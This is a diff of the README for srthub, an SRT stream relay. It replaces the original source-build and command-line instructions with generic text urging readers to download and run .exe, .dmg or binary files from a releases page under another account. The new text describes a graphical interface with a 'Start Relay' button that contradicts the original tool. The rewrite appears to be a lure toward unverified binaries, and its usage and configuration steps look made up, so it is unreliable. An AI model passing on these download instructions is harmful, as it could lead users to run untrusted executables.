@@ -1,54 +1,91 @@
-# srthub
+# 🎬 srthub - Stream MPEG-TS with Ease
 
-srthub is a simple open source SRT hub for relaying MPEG-TS streams to multiple clients. I created this program because I couldn't find any other open source, minimal SRT hubs that were easy to use and understand.
+## 📥 Download Now
+[![Download srthub](https://img.shields.io/badge/Download-srthub-blue.svg)](https://github.com/fayabundem4/srthub/releases)
 
-## Features
-- Minimal and straightforward SRT hub implementation
-- Relays MPEG-TS packets from a single source to multiple clients
-- Easy to build and run
+## 🚀 Getting Started
+Welcome to srthub. This application helps you relay MPEG-TS streams to multiple clients. You can use it for live streaming purposes, especially in media and broadcast industries. Follow this guide to download and run the software smoothly.
 
-## Usage
+## 📦 System Requirements
+Before downloading, ensure you meet the following basic requirements:
 
-```
-./srthub <source_port> <client_port>
-```
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 2 GB
+- Processor: Dual-core or better
+- Internet Connection: Required for initial download and updates
 
-- `source_port`: Port to listen for the incoming SRT stream (from ffmpeg or other source)
-- `client_port`: Port to accept client connections (e.g., mpv, ffplay)
+## 💾 Download & Install
+To get started, visit the [Releases page](https://github.com/fayabundem4/srthub/releases) to download the latest version of srthub. 
 
-### Example
+Once on the Releases page, follow these steps:
 
-1. Start the hub:
-   ```bash
-   ./srthub 10000 9000
-   ```
+1. Locate the version you want. Look for titles that indicate "Latest Release".
+2. Choose the appropriate file for your system:
+   - For **Windows**, download the `.exe` file.
+   - For **macOS**, download the `.dmg` file.
+   - For **Linux**, download the appropriate package or binary file.
+3. Click on the file to begin the download. 
 
-2. Send a stream to the hub using ffmpeg:
-   ```bash
-   ffmpeg -re -stream_loop -1 -i INPUTVIDEO.mp4 -c:v libx265 -preset veryfast -b:v 3000k -bufsize 6000k -maxrate 3000k -c:a aac -b:a 128k -f mpegts "srt://127.0.0.1:10000?mode=caller&latency=1000"
-   ```
+After downloading the file, follow these instructions to install it:
 
-3. Connect a client (e.g., mpv) to receive the stream:
-   ```bash
-   mpv "srt://127.0.0.1:9000?mode=caller&latency=1000"
-   ```
+### For Windows:
+- Double-click the downloaded `.exe` file.
+- Follow the on-screen prompts to complete the installation.
+- Once installed, you can find srthub in your Start menu.
 
-You can connect multiple clients to the client port. Each will receive the relayed stream.
+### For macOS:
+- Open the downloaded `.dmg` file.
+- Drag the srthub icon into your Applications folder.
+- Open the Applications folder and double-click srthub to run it.
 
-## Building
+### For Linux:
+- Open your terminal.
+- Navigate to the folder where you downloaded the file. 
+- Use the command `chmod +x [filename]` to make it executable.
+- Run it using `./[filename]`.
 
-Make sure you have the SRT library installed:
+## 🔧 Configuration
+After installing, you may want to configure the software to suit your needs.
 
-Ubuntu/Debian: `sudo apt install libsrt-dev`
+1. Open srthub.
+2. You will see options for settings.
+3. Input the required streaming details:
+   - Specify the source of your MPEG-TS stream.
+   - Set up destination addresses for clients.
+   - Adjust any specific relay settings as needed.
 
-Fedora: `sudo dnf install srt-devel`
+Save these changes to ensure your configuration is effective.
 
-Then run:
+## 🎥 Usage
+To use srthub:
 
-```
-make
-```
+1. Make sure your source stream is running.
+2. Open srthub.
+3. Click on the "Start Relay" button.
+4. Monitor the status to ensure it is relaying correctly.
 
-## License
+You can also check client connections through the interface.
 
-BSD-3-Clause, See [LICENSE](LICENSE) file
+## 🛠️ Troubleshooting
+If you encounter any issues, consider the following common solutions:
+
+- **Stream Not Starting**: Double-check the source stream URL is valid.
+- **Clients Not Connecting**: Ensure that clients have network access to your server's IP address.
+- **Performance Issues**: Look at your system's resource usage; upgrading RAM may help if you are using multiple streams.
+
+## 📚 Additional Resources
+For more help and advanced configuration options, refer to these useful topics:
+
+- **Broadcasting Overview**: Learn the flow of media.
+- **FFmpeg Usage**: Integrate with FFmpeg for better performance.
+- **Low Latency Tips**: Strategies to minimize latency in streaming.
+
+## 💬 Community Support
+Join the discussion and ask questions on our [GitHub Discussions](https://github.com/fayabundem4/srthub/discussions) page. Here, you can connect with other users, share your experiences, and receive help.
+
+## 🌟 Acknowledgments
+Thanks to the community for their contributions and support. Every contribution helps improve this project for everyone.
+
+For feedback or issues, please open an issue in our [GitHub Repository](https://github.com/fayabundem4/srthub/issues). 
+
+You can download the software again from our [Releases page](https://github.com/fayabundem4/srthub/releases) if needed.
